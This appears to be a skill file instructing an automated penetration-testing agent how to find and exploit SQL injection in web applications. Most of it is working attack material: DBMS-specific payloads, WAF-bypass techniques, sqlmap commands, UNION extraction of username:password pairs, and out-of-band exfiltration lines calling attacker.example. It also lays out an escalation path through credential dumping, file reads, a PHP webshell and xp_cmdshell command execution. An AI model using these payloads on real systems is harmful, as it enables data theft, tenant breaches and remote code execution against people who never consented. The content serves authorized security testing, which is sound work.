---
name: sqli-testing
description: Detect and exploit SQL injection vulnerabilities in web application parameters
origin: Vigil
vuln_class: sqli
---

# SQL Injection Testing

## When to Activate

- Parameter reaches a database query — but be specific: search fields, login forms, filter/sort controls, ID lookups, API fields that drive WHERE/ORDER BY/LIKE clauses, bulk operations with IN(...), and **any parameter that changes the shape of the response** (column count, row ordering, data presence/absence)
- Error messages leak backend identity: `You have an error in your SQL syntax`, `PSQLException`, `ORA-`, `SQLITE_ERROR`, `Unclosed quotation mark`
- Numeric parameters that accept arithmetic: `?id=2-1` returns the same result as `?id=1`
- JSON/GraphQL bodies where values feed database operations — ORMs often parameterize scalars but pass objects and arrays unsafely

---

## Where SQLi Actually Lives in 2025

Modern frameworks auto-parameterize by default. Django's ORM, Rails ActiveRecord, Express with Sequelize/Prisma, Spring Data JPA — if the developer uses the ORM normally, injection is dead. The bugs that still pay live in the gaps the ORM does not cover:

**High-yield injection surfaces (where parameterization breaks down):**

- **Raw SQL / query builder escapes** — `ActiveRecord.connection.execute("SELECT * FROM users WHERE role = '#{params[:role]}'")`, Django's `raw()`, Sequelize's `sequelize.query()`, Prisma's `$queryRaw`. Every ORM has an escape hatch and developers use them for "complex" queries. Search for `raw`, `execute`, `query`, `$queryRaw`, `$executeRaw` in source code.
- **Dynamic column/table names** — ORMs parameterize VALUES, not identifiers. `ORDER BY #{params[:sort]}` is injectable even in fully parameterized apps because column names cannot be prepared-statement bound. This is the single most common SQLi in modern SaaS applications.
- **ORDER BY injection** — the sort parameter on any table view. Parameterized queries cannot bind ORDER BY clauses. Test with `?sort=1`, `?sort=name`, `?sort=name ASC, (SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END)--`. If the error/response changes, you have injection. ORDER BY is almost always blind (no data reflection), so pivot to conditional error or time-based extraction.
- **LIKE/search wildcards** — `WHERE name LIKE '%${input}%'` may be parameterized for the string but the LIKE pattern itself is user-controlled. Input `%` returns everything, `_` matches single characters. Not classic injection but often leads to data exposure.
- **Dynamic IN(...) clauses** — some ORMs build `WHERE id IN (1,2,3)` by string interpolation when handling arrays, especially in older PHP/Java codebases.
- **Stored procedures** — parameterized at the app layer but the procedure itself may concatenate inputs into dynamic SQL internally. `EXEC sp_GetUser @name='` + input + `'` inside the procedure body is invisible from the outside.
- **Second-order injection** — input is safely stored (parameterized INSERT) but later retrieved and concatenated into a different query without re-sanitization. Classic pattern: user profile name stored safely, then used unsafely in an admin report query. Multi-tenant SaaS is rich territory because admin panels often build reports using stored user data.
- **JSON/JSONB query operators** — PostgreSQL's `->`, `->>`, `@>`, `#>` operators in application code often get string-interpolated when building dynamic JSON path queries. Rails `where("data->>'#{key}' = ?", value)` parameterizes the value but not the key.

**What is genuinely rare now:** Classic `' OR 1=1--` in a login form on a framework-backed application. It still exists in bespoke PHP, legacy ASP.NET WebForms, and custom Java servlets — but spraying auth bypass payloads at a Django/Rails app is wasted time. Check the tech stack first.

---

## Detection Decision Tree

Think in stages, not spray patterns.

```
START
  |
  v
[1] What is the tech stack?
  |-- Modern framework (Django, Rails, Express+ORM, Spring Boot)?
  |     --> Skip classic injection probes on standard CRUD.
  |     --> Hunt for: raw queries, ORDER BY, sort params, search, admin panels,
  |         report builders, export features, bulk operations.
  |
  |-- Legacy / bespoke (raw PHP, classic ASP, custom Java servlets)?
  |     --> Full injection testing is warranted on all parameters.
  |
  |-- Unknown?
  |     --> Start with arithmetic test and error provocation, then decide.
  |
  v
[2] Can you provoke a database error?
  |-- Send: single quote ('), double quote ("), backslash (\), NULL byte (%00)
  |-- Numeric params: try 1/0, 1 AND 1=CONVERT(int,'a')
  |
  |-- YES, got SQL error in response?
  |     --> Database identified. Go to [3a] Error-Based.
  |
  |-- YES, got generic 500 but no SQL detail?
  |     --> Probably injectable but errors suppressed. Go to [3b] Boolean-Based.
  |
  |-- NO error, response unchanged?
  |     --> Try arithmetic: ?id=2-1 (should return id=1 result)
  |     --> If arithmetic works: confirmed injection, go to [3b].
  |     --> If not: go to [3c] Time-Based as last resort.
  |
  v
[3a] Error-Based (fastest extraction — 1 request per data item)
  |-- MySQL:  ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
  |-- PG:     ' AND 1=CAST((SELECT version()) AS int)--
  |-- MSSQL:  ' AND 1=CONVERT(int,(SELECT @@version))--
  |-- If errors reflect data: enumerate databases, tables, columns, dump.
  |-- If errors exist but don't reflect data: fall through to [3b].
  |
  v
[3b] Boolean-Based (moderate speed — 7-8 requests per character)
  |-- Establish TRUE baseline:  ?id=1 AND 1=1
  |-- Establish FALSE baseline: ?id=1 AND 1=2
  |-- Response differs? Confirmed. Extract via:
  |     ?id=1 AND SUBSTRING(version(),1,1)='8'
  |     Binary search ASCII values for speed.
  |-- Response identical for both? Not boolean-injectable. Go to [3c].
  |
  v
[3c] Time-Based (slowest, noisiest — last resort)
  |-- SEE SECTION: "Time-Based Detection in Noisy Networks" below.
  |-- MySQL:  ' AND SLEEP(3)--
  |-- PG:     '; SELECT pg_sleep(3)--
  |-- MSSQL:  '; WAITFOR DELAY '0:0:3'--
  |
  v
[3d] Out-of-Band (when time-based is unreliable)
  |-- Requires OOB callback infrastructure. Confirm with `vigil oob status --json`.
  |-- Mint a nonce-tagged host, embed it, then poll for the correlated hit
  |     (replaces reading the listener log by hand). See "Out-of-Band Correlation" below.
  |-- MySQL:  ' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.<NONCE_HOST>\\a'))--
  |-- MSSQL:  '; EXEC master..xp_dirtree '\\<NONCE_HOST>\a'--
  |-- PG:     '; COPY (SELECT version()) TO PROGRAM 'curl http://<NONCE_HOST>/'--
  |-- OOB is the most reliable blind detection method when available.
  |-- MySQL LOAD_FILE requires FILE privilege (disabled by default since 5.7.6
  |     with secure_file_priv). MSSQL xp_dirtree works on most default installs.
```

### Out-of-Band Correlation

Mint a unique callback host per injection point and let the correlator bind the hit to the probe — never eyeball the listener log:

```bash
vigil oob mint --technique sqli --target-url "https://target/item?id=1" --param id --probe-kind dns
# -> nonce  <prefix>-<token>
#    dns    <prefix>-<token>.oob.example.com   (use as <NONCE_HOST> above)
```

Substitute the minted host for `<NONCE_HOST>` in the payloads above (xp_dirtree is the single most reliable vector — not disabled by default, no sysadmin needed), deliver via the kali exec wrapper, then:

```bash
vigil oob poll --client <name> --json
```

A non-empty `matched` array for your nonce is the confirmation: each match pairs the callback (`protocol`, `remote_address`) with the recorded probe (`technique`, `target_url`). For a `CONCAT(version(),...)`-style exfil payload the leaked DB version arrives as the left label of the matched callback host. Reproduce from a second independent payload shape before declaring, then chain to file read / `xp_cmdshell` where the DB supports it. Empty `matched` after the payload lands → fall back to boolean/time-based and record a runtime issue.

---

## Typing the Injected Value

At decision-tree node `[2]`, before hand-rolling probes, classify the value the parameter currently carries and let the oracle generate type-aware variants. This is most productive for ID-bearing and JSON-body parameters — the `format` bucket directly exercises the type-confusion path this skill flags (ORMs that parameterize scalars but pass objects/arrays unsafely):

```bash
vigil assess classify-payload "42" --mutations          # type: sequential_id
vigil assess classify-payload "2025-06-01" --mutations  # type: date
```

Consume by intent bucket:

- **`format`** — for a `sequential_id`/`integer` value this yields `"42"` (int-as-string), `[42]` (int-as-array), `{"id": 42}` (int-as-object), `null`, `[]` (and, past the default 5-cap, `{}` and `42.0` — pass `--max-per-intent 7`). Drop these into a JSON body or nested param (`{"user_id": [42]}`) to test whether the query builder string-interpolates non-scalar inputs — the exact gap behind the "JSON API injection" and "Batch/bulk endpoints" patterns below.
- **`boundary`** — `0`, `-1`, `1`, `99999999`, `2147483647` (raise the cap for `-2147483648` and `9999999999999`) probe integer-overflow and off-by-one handling; pair with the `?id=2-1` arithmetic test (arithmetic that resolves server-side confirms a numeric injection context).
- **`empty`** — empty string, `null`, `undefined`, a single space, and a NUL byte exercise null-handling in the WHERE clause.

These are deterministic seed variants for the injection-context probe — they do not replace the DBMS-specific UNION/error/blind payloads (which are query *fragments*, not typed parameter values; pull those from the payload reference once the database is fingerprinted).

---

## Time-Based Detection in Noisy Networks

Time-based is the technique most likely to give false results. Network jitter, load balancers, application-level rate limiting, and database connection pooling all create latency that mimics or masks sleep behavior.

**Establishing a baseline (mandatory before any time-based test):**

1. Send 5 normal requests to the same endpoint. Record response times.
2. Calculate the median and the standard deviation.
3. Your sleep delay must be at least 3x the standard deviation. If median response is 200ms with 150ms jitter, a 1-second SLEEP will produce ambiguous results. Use SLEEP(5) minimum.
4. If jitter exceeds 2 seconds, time-based detection is unreliable on this target. Switch to OOB or boolean-based.

**Confirmation protocol:**

- Never confirm on a single delayed response. Run the conditional pattern:
  - `IF(1=1, SLEEP(N), 0)` should delay
  - `IF(1=2, SLEEP(N), 0)` should NOT delay
- Run each 3 times. If the true condition delays consistently and the false condition does not, injection is confirmed.
- If results are inconsistent, the delay may be from connection pooling (shared sleep across threads on MySQL < 5.7) or WAF throttling. Increase delay or switch methods.

**BENCHMARK vs SLEEP (MySQL):** `BENCHMARK(10000000, SHA1('x'))` is an alternative to SLEEP that works even when SLEEP is disabled by the DBA. But execution time varies by server hardware — calibrate on the target first.

---

## Boolean Triage on Dynamic Content

`[3b] Boolean-Based` lives or dies on the TRUE-vs-FALSE response *differential*. On pages with timestamps, CSRF tokens, rotating ads, or per-request nonces, raw length/word counts wobble enough to mask (or fake) the signal — the same noise that gives sqlmap boolean false positives. Rather than eyeballing two near-identical bodies, capture the response population and let the anomaly oracle find the genuine outlier.

Collect one record per probe (the TRUE/FALSE pair, ideally interleaved with a few benign baselines) as JSONL, then rank:

```bash
# each line: {"url":"...AND 1=1","status":200,"content_length":5120,"words":410,"lines":88}
vigil assess anomaly-score boolean_probes.jsonl --top 5
```

Consume the ranking: the oracle buckets near-equal lengths/words so dynamic jitter clusters together, and **degrades the weight of near-unique columns** so a per-response CSRF token cannot dominate. If the `AND 1=1` and `AND 1=2` rows fall into *different* buckets while your benign baselines cluster, that structural split is your boolean differential — promote it and start `SUBSTRING(...)` extraction against the side that flips. If TRUE, FALSE, and baselines all score ~0 (same buckets), the parameter is not boolean-injectable on this signal — drop to `[3c]` time-based. This is also the triage step for an Intruder/sqlmap fuzz dump: feed the whole result set in and investigate the top-ranked outlier first.

---

## WAF Bypass Reality

Every pentester's first instinct is to Google "WAF bypass payloads." Here is what actually matters in 2025:

**What Cloudflare/AWS WAF/Akamai actually block well:**
- Bare `UNION SELECT`, `OR 1=1`, `AND 1=1` — signature-matched, caught instantly
- `SLEEP(`, `WAITFOR DELAY`, `BENCHMARK(` — time-based keywords are in every default ruleset
- `information_schema`, `sys.tables`, `xp_cmdshell` — post-exploitation keywords
- Comment-based splitting (`UN/**/ION`) — this bypass is from 2012, every WAF catches it now

**What still slips through (as of late 2024 / early 2025):**
- **Parameter pollution** — `?id=1&id=UNION SELECT` where the backend concatenates or uses the last value but the WAF inspects the first. Works surprisingly often against AWS ALB + WAF combinations.
- **JSON body injection** — WAFs focused on URL parameters and form bodies often have weaker inspection of `application/json` payloads, especially nested objects. If the endpoint accepts JSON, try `{"id": "1 UNION SELECT 1,2,3--"}`.
- **Chunked transfer encoding** — splitting the payload across HTTP chunk boundaries. `Transfer-Encoding: chunked` with the UNION in one chunk and SELECT in the next. Some WAFs only inspect the first chunk or reassemble incorrectly.
- **Unicode normalization** — `%EF%BC%87` (fullwidth apostrophe) normalizes to `'` in some backends. MySQL with `utf8mb4` may accept fullwidth characters that the WAF does not recognize as SQL metacharacters.
- **Double URL encoding** — `%2527` decodes to `%27` at the WAF, then to `'` at the application if it double-decodes. Only works when the app explicitly URL-decodes (legacy PHP `rawurldecode` patterns).
- **HPP + verb tampering** — send the same request as GET with clean params AND POST with injection. Some WAFs only inspect the verb they expect.
- **Numeric context without quotes** — if the parameter is numeric, injection like `1 AND 1=1` contains no special characters that trigger string-oriented rules. Many WAFs only flag quote-based payloads aggressively.

**Practical approach:** Do not start with bypass attempts. First confirm whether a WAF is present (`--identify-waf` in sqlmap, or manually observe 403/406 responses with consistent error pages). If no WAF, use clean payloads. If WAF exists, identify which vendor (response headers, error page fingerprint) and then select targeted bypasses instead of spraying tamper scripts.

---

## sqlmap: When It Works, When It Lies

sqlmap is the right tool for confirmed injection points that need exploitation depth. It is the wrong tool for initial discovery on modern applications.

**When sqlmap gives false negatives (misses real bugs):**
- **ORDER BY injection** — sqlmap tests value-position injection. ORDER BY injection is structural (the injected value is a column reference, not a WHERE value). You need `--prefix` and `--suffix` to frame the injection point correctly, and even then sqlmap may not recognize the output differential.
- **Second-order injection** — sqlmap sends payloads and checks the SAME response for evidence. Second-order bugs trigger in a DIFFERENT endpoint. Use `--second-url` but be aware it only checks one alternate URL, not the actual vulnerable retrieval path.
- **JSON/nested parameters** — sqlmap's parameter parsing for JSON bodies is brittle. Use `-r` with a raw request file and manually mark the injection point with `*`: `{"search": "test*"}`.
- **Custom content types** — GraphQL, XML, multipart with nested structures. sqlmap expects form or query string parameters by default.

**When sqlmap gives false positives:**
- **Time-based on slow endpoints** — sqlmap's default time threshold is 5 seconds. If the endpoint is already slow (database-heavy, external API calls), normal latency triggers false positives. Use `--time-sec=10` or higher, and `--technique=BEU` to skip time-based entirely during initial detection.
- **Boolean-based on dynamic content** — pages with timestamps, random quotes, CSRF tokens, or ad rotations create response-length variations that sqlmap interprets as boolean differentials. Use `--string="known_static_text"` or `--not-string="error_text"` to give sqlmap a stable comparison anchor.
- **WAF blocking as injection evidence** — WAF 403 responses from blocked payloads sometimes have different content lengths than normal responses. sqlmap may interpret the WAF block as a boolean differential. If every payload returns 403, that is the WAF talking, not injection.

**Tuning for real engagements:**
```bash
# Discovery phase — fast, low noise
sqlmap -u "URL" --batch --technique=BEU --level=2 --risk=1 --threads=3

# Confirmed injection — full exploitation
sqlmap -u "URL" --batch --dbs --level=3 --risk=2

# Behind a WAF — targeted bypass
sqlmap -u "URL" --batch --tamper=between,randomcase --delay=2 --random-agent

# ORDER BY injection — requires manual framing
sqlmap -u "URL" --batch --prefix="name ASC," --suffix="-- " --technique=E

# From saved request with marked injection point
sqlmap -r request.txt --batch --dbs --level=3 --risk=2

# Rate-limited target — respect limits or get IP-banned
sqlmap -u "URL" --batch --delay=3 --timeout=30 --retries=5 --threads=1
```

**Rate limiting:** If the target returns 429s or starts blocking, `--delay=N` (seconds between requests) is the primary control. `--safe-url` and `--safe-freq` let you intersperse normal requests to avoid pattern detection. On heavily rate-limited targets, sqlmap's throughput may make blind extraction impractical — calculate extraction time before committing (blind boolean extraction of a 32-char hash at 8 requests/character with 3-second delays = ~13 minutes for one value).

---

## Exploitation Depth: After Confirming Injection

Confirming injection is step one. Impact determines severity. A boolean blind SQLi in a search parameter is interesting; reading `/etc/shadow` through it is critical.

**Escalation path (in order of increasing impact and decreasing likelihood):**

```
[1] Data extraction (almost always possible)
  |-- Enumerate databases, tables, columns
  |-- Dump credentials table
  |-- Extract API keys, tokens, PII from application tables
  |-- SEVERITY: High (PII/credentials) to Medium (non-sensitive data)
  |
  v
[2] Cross-database access
  |-- MySQL: information_schema.schemata → all databases on the server
  |-- MSSQL: master..sysdatabases → discover co-hosted applications
  |-- Can you read another application's database? Multi-tenant shared DB is common
  |     in SaaS — one injection may reach all tenants.
  |-- SEVERITY: Critical (tenant isolation breach)
  |
  v
[3] File system read
  |-- MySQL: LOAD_FILE('/etc/passwd') — requires FILE privilege.
  |     Blocked by secure_file_priv (default since MySQL 5.7.6 on most distros).
  |     Check: SELECT @@secure_file_priv — if NULL, FILE is completely disabled.
  |     If set to a path like /var/lib/mysql-files/, reads are limited to that dir.
  |     RDS/Cloud SQL: FILE privilege is never granted. Do not waste time.
  |-- PG: COPY ... TO/FROM requires superuser or pg_read_server_files role.
  |     pg_read_file() works for cluster-local files with pg_read_server_files role.
  |-- MSSQL: OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) — requires ADMINISTER BULK
  |     OPERATIONS permission. Rare on modern installs.
  |-- SEVERITY: High to Critical depending on file contents
  |
  v
[4] File system write
  |-- MySQL: SELECT ... INTO OUTFILE '/var/www/html/shell.php' — same FILE
  |     privilege restriction as LOAD_FILE, plus write access to web root.
  |     Double-gated: need FILE privilege AND writeable web-accessible directory.
  |-- PG: COPY ... TO requires superuser.
  |-- MSSQL: xp_cmdshell → echo to file (see OS command below).
  |-- SEVERITY: Critical (webshell = RCE)
  |
  v
[5] OS command execution
  |-- MySQL: Almost never works in 2025. UDF (User Defined Functions) require
  |     writing .so/.dll to plugin_dir + CREATE FUNCTION privilege. Cloud-hosted
  |     MySQL never allows this.
  |-- PG: COPY ... TO PROGRAM 'cmd' — requires superuser. Devastating when
  |     available. On self-hosted PG with superuser injection, this is your path.
  |     Cloud-hosted PG (RDS, Cloud SQL): COPY TO PROGRAM is disabled.
  |-- MSSQL: xp_cmdshell — disabled by default since SQL Server 2005 but can be
  |     re-enabled with sysadmin role: EXEC sp_configure 'xp_cmdshell', 1;
  |     RECONFIGURE; EXEC xp_cmdshell 'whoami'. On cloud-hosted MSSQL (Azure SQL
  |     DB): xp_cmdshell does not exist at all.
  |-- SEVERITY: Critical (RCE)
  |
  v
[6] Network pivot / OOB exfiltration
  |-- When direct data extraction is not possible (blind injection, no error
  |     reflection), exfiltrate via DNS or HTTP:
  |-- MySQL DNS: LOAD_FILE(CONCAT('\\\\',version(),'.attacker.example\\x'))
  |-- MSSQL DNS: EXEC master..xp_dirtree '\\attacker.example\x'
  |     xp_dirtree is NOT disabled by default and does not require sysadmin.
  |     This is the single most reliable OOB vector across all DBMS.
  |-- PG HTTP: COPY (SELECT version()) TO PROGRAM 'curl http://attacker.example/'
  |-- SEVERITY: varies by what is extracted
```

**Cloud-hosted databases (RDS, Azure SQL, Cloud SQL, Aurora):** file read, file write, and OS command execution are blocked by design. Do not waste time attempting these. Focus on data extraction and cross-database/cross-schema access. The realistic critical path on cloud-hosted DBs is: data extraction -> credential theft from application tables -> lateral movement using stolen credentials.

---

## Real-World Patterns from Engagements

**Second-order SQLi in multi-tenant SaaS:**
User registration stores `company_name` safely via parameterized INSERT. Admin reporting panel builds a query: `"SELECT * FROM users WHERE company = '" + company_name + "'"`. The admin panel is built by a different team, uses a different ORM (or raw queries for "performance"), and nobody thought to re-validate data already in the database. Test by: register with a company name containing a single quote, then trigger any admin-facing feature that uses that data (reports, exports, search, audit logs). If you do not have admin access, this is where second-order blind payloads matter — store a time-based payload and wait for an admin action to trigger it.

**ORDER BY injection in sort parameters:**
Present on nearly every table-view endpoint that allows column sorting. The URL looks like `?sort=created_at&direction=desc`. The backend builds `ORDER BY created_at DESC`. Injection: `?sort=created_at,(SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END)&direction=desc`. If `1=1` returns normally and `1=2` causes an error or different sort, confirmed. This bypasses parameterized queries entirely because column names are identifiers, not values. sqlmap does not detect this automatically — you must test it manually or use `--prefix`/`--suffix` to frame the injection context.

**LIKE wildcard abuse for data exposure:**
Not injection in the traditional sense, but `%` in a search parameter often returns all records. On endpoints with pagination that returns total count (`"total": 50000`), this reveals dataset size. On endpoints without pagination limits, this dumps the entire table. Combine with `_` (single-character wildcard) for targeted enumeration: `___` matches all 3-character values.

**JSON API injection:**
REST APIs accepting JSON bodies frequently use different code paths than form-based endpoints. The form endpoint may use the ORM; the JSON endpoint may use a query builder with string interpolation for "flexibility." Test: `{"user_id": "1 AND 1=1"}` vs `{"user_id": "1 AND 1=2"}`. Also test nested objects: `{"filter": {"name": "test' OR '1'='1"}}` — ORMs that handle flat values safely may pass nested objects through unsafely.

**GraphQL injection:**
GraphQL resolvers that pass arguments directly to SQL are surprisingly common. The GraphQL layer validates types but the resolver may still interpolate: `query { user(name: "admin' OR '1'='1") { id } }`. Enum arguments for sorting/filtering are especially vulnerable because they are often mapped directly to column names without validation.

**Batch/bulk endpoints:**
APIs with batch operations (`POST /api/users/bulk-delete` with `{"ids": [1,2,3]}`) sometimes build `WHERE id IN (1,2,3)` via string join. If IDs are not individually validated as integers, injection via: `{"ids": [1, "2 OR 1=1"]}`.

---

## Database Identification

When error messages are visible, fingerprint immediately — it determines your entire payload selection:

| Indicator | Database |
|-----------|----------|
| `You have an error in your SQL syntax`, `MariaDB` | MySQL / MariaDB |
| `unterminated quoted string`, `PSQLException`, `ERROR:` | PostgreSQL |
| `Unclosed quotation mark`, `Microsoft SQL`, `Incorrect syntax` | MSSQL |
| `SQLITE_ERROR`, `unrecognized token`, `no such table` | SQLite |
| `ORA-`, `quoted string not properly terminated`, `PLS-` | Oracle |

When errors are suppressed, use behavioral fingerprinting:
- **Concatenation:** `'a'||'b'` works on PG/Oracle/SQLite. `'a'+'b'` works on MSSQL. `CONCAT('a','b')` works on MySQL.
- **Comments:** `-- ` (with trailing space) works everywhere. `#` is MySQL-only.
- **String functions:** `SUBSTR()` on Oracle/SQLite/PG. `SUBSTRING()` on MySQL/MSSQL.
- **Conditional:** MySQL uses `IF()`. PG/MSSQL/Oracle/SQLite use `CASE WHEN`.

---

## UNION-Based Extraction Quickstart

UNION is the fastest extraction technique when available (full data in response). It requires: (1) the injection point reflects data, and (2) you can match the column count and types.

```
Step 1: Find column count
  ?id=1 ORDER BY 1--    (success)
  ?id=1 ORDER BY 5--    (success)
  ?id=1 ORDER BY 10--   (error -> between 5 and 10)
  ?id=1 ORDER BY 7--    (narrow down with binary search)

Step 2: Match column count with NULLs
  ?id=-1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
  (Use -1 or 0 for the original ID to suppress the real row)

Step 3: Find which columns are reflected in the response
  ?id=-1 UNION SELECT 'a','b','c','d','e','f','g'--
  Look for a/b/c/d/e/f/g in the HTML output. Note which positions appear.

Step 4: Extract through reflected columns
  ?id=-1 UNION SELECT NULL,version(),NULL,NULL,current_user(),NULL,NULL--
  ?id=-1 UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL
    FROM information_schema.tables WHERE table_schema=database()--
  ?id=-1 UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL
    FROM information_schema.columns WHERE table_name='users'--
  ?id=-1 UNION SELECT NULL,CONCAT(username,':',password),NULL,NULL,NULL,NULL,NULL
    FROM users--
```

**When UNION fails:** response does not reflect injected data (API returns fixed JSON structure, page renders template-driven content). Fall back to error-based or blind.

---

## Kill Signals — Stop Testing When
- Framework uses ORM exclusively (Django ORM, ActiveRecord, Prisma, Sequelize) with no raw queries in scope → skip classic injection, test only ORDER BY / dynamic identifiers
- First 5 error-provocation probes all return identical responses with no timing delta → parameterized queries likely, move to next endpoint
- WAF blocks all payloads AND no alternative injection context found (JSON body, headers) → escalate to operator or move on
- sqlmap confirms injection → stop manual probing, proceed to exploitation depth
- Target is cloud-hosted managed DB (RDS, Cloud SQL) → file read/OS command will fail, cap exploitation at data extraction

## Escalate When
- A syntactically invalid payload returns the same body as a valid one — errors are swallowed at a WAF/ORM layer, but boolean-blind and time-based channels are still live, switch probe style before moving on
- Response time drifts beyond the measured network jitter baseline on a SLEEP/pg_sleep/WAITFOR payload — jitter is measured not guessed, and a clean delta warrants full boolean-blind extraction
- The same parameter behaves differently under different encodings of the same character (URL-encoded quote, double URL-encoded, percent-encoded NUL, Unicode decomposition, backslash-escape) — frontend/backend parser disagreement is the classic filter-bypass tell
- An OOB DNS or HTTP callback fires from a stacked-query or UNC-path payload — reproduce from a second independent payload shape before declaring, then chain to file read / xp_cmdshell where the DB supports it
- The endpoint uses an ORM but a non-parameterized path exists (raw SQL escape hatch, LIKE with user-controlled pattern, ORDER BY / GROUP BY / column-name from input, reflective query builder), or a "generic" 500 leaks a driver / DB version / table name — those are the gaps the framework does not cover

## Extended Resources

- `agent/references/payloads/sqli-payloads.md` -- UNION, blind, error-based, time-based, WAF bypass, auth bypass, OOB, stacked query payloads per database type. Use this as the payload library once you have identified the database and injection type from the decision tree above.
- `agent/references/tools/exploitation/sqlmap.md` -- sqlmap flags, tamper scripts, technique selection, and session management. Consult for exploitation depth after confirming injection.
